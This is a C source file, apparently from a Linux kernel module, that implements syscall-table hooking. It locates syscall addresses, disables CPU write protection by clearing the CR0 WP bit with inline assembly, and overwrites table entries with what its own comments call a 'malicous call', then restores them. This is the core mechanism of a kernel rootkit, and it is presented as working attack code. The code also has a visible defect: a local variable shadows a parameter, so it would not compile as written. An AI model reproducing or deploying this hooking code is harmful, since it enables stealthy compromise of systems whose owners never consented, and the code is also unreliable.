/*=========================================*\
  functions and structs for syscall hooking
\*=========================================*/

#include <linux/kernel.h> //contains types, macros, functions for the kernel   e.g. KERN_INFO
#include <linux/unistd.h> //contains syscall names to numbers
#include <linux/version.h> //contains versions  e.g. LINUX_VERSION_CODE KERNEL_VERSION
#include <asm/paravirt.h> //contains functions for read_cr0()
#include <linux/kprobes.h> //kprobes- used in workaround for kallsyms_lookup_name not exported

typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs); //syscalls in new kernel use pt_regs struct for information, so is generic fnction type for syscalls
struct hook_t { //hook data type for the hooking functions
	int syscall_number; //syscall number of syscall
	ptregs_t orig_syscall; //adress of the original syscall
	ptregs_t hooked_syscall; //adress of the original syscall
};

static ptregs_t locate_syscall(int syscall); //locates the memory address of a sysyscall
static int write_cr0_forced(unsigned long val); //rewrites the cr0 value in the cpu
static int set_memory_protection(bool val); //disables/enables memory protection
static int install_hook(struct hook_t *hook); //overwrites sycall in table to memory address of malicous call
static int remove_hook(struct hook_t *hook); //restores syscall in the table to original address




static ptregs_t locate_syscall(int syscall){
	ptregs_t syscall = (ptregs_t) __sys_call_table[syscall]; //looks up the syscall in the table
	return syscall;
}

static int write_cr0_forced(unsigned long val){
	//code from here- https://medium.com/@hadfiabdelmoumene/change-value-of-wp-bit-in-cr0-when-cr0-is-panned-45a12c7e8411
	unsigned long __force_order;
	//nasm code to rewrite cr0
	asm volatile(
		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order));
	//to prevent reads from being recorded with
	//respect to writes, use dummy memory operand
	//"+m"(__force_order)
	return 0;
}

static int set_memory_protection(bool val){
	if (val){ //turn memory protection on
		//bitwise OR copies bit to result if it is in either operands
		return write_cr0_forced(read_cr0() | (0x10000));
	}
	else{
		//bitwise AND copies bits to result if it is in both operands
		//unary reverse (~) reverses bits so 0x10000 becomes 0x01111
		return write_cr0_forced(read_cr0() & (~ 0x10000));
	}
}

static int install_hook(struct hook_t *hook){
	hook->orig_syscall=locate_syscall(hook->syscall_number); //stores the original syscall
	if (!hook->orig_syscall){
		return -1;
	};
	if (set_memory_protection(false)){
		log("[hooks.c::install_hook] ERROR    unable to disable memory protection\n");
		return -1;
	};

	__sys_call_table[hook->syscall_number] = (long unsigned int) hook->hooked_syscall; //rewrites the adress of the syscall to hooked function

	if (set_memory_protection(true)){  //enables memory protection in cr0- if true memory cannot be reenabled
		log("[hooks.c::install_hook] ERROR    unable to enable memory protection\n");
		return -1;
	};
	return 0;
}

static int remove_hook(struct hook_t *hook){
	if (!hook->orig_syscall){ //if unable to get original syscall
		log("[hooks.c::install_hook] ERROR    orig_syscall not a memory adress\n");
		return -1;
	};
	if (set_memory_protection(false)){
		log("[hooks.c::remove_hook] ERROR    unable to disable memory protection\n"); //prints message on server
		return -1;
	};
	__sys_call_table[hook->syscall_number] = (long unsigned int) hook->orig_syscall;
	if (set_memory_protection(true)){
		log("[hooks.c::remove_hook] ERROR    unable to enable memory protection\n\n");
		return -1;
	};
	return 0;
}
